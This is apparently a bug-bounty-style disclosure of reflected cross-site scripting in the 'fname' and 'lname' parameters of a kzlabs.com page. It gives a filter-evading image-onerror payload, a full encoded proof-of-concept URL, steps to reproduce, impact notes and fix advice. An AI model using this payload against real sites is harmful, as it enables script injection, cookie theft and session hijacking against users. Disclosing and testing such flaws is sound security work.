# Reflected Cross-Site Scripting (XSS) via `fname` and `lname` Parameters

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `fname` and `lname` parameters of the application. User-controlled input is reflected into the response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="d8x3mv"
http://kzlabs.com/4.php?fname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%281%29%3E&lname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%2821%29%3E
```

---

## Vulnerable Parameters

```text id="h5q2zn"
fname
lname
```

---

## Payloads Used

```html id="u7c1ra"
"><iMg src=x onerror=\u0063onfirm?.(1)>
```

```html id="k3m8wy"
"><iMg src=x onerror=\u0063onfirm?.(21)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/4.php?fname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%281%29%3E&lname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%2821%29%3E
   ```

2. Observe that the payloads are reflected into the response.

3. JavaScript executes automatically and triggers popup dialogs.

---

## Proof of Concept

```text id="n4v7pb"
http://kzlabs.com/4.php?fname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%281%29%3E&lname=%22%3E%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%2821%29%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/bc072516-a24a-4c10-9275-16196c5a476e" />


<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/569af446-0a27-45d0-863f-765ee347ba10" />


---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft

---

## Recommendations for Fix

* Encode output before rendering
* Validate and sanitize user input
* Use context-aware escaping
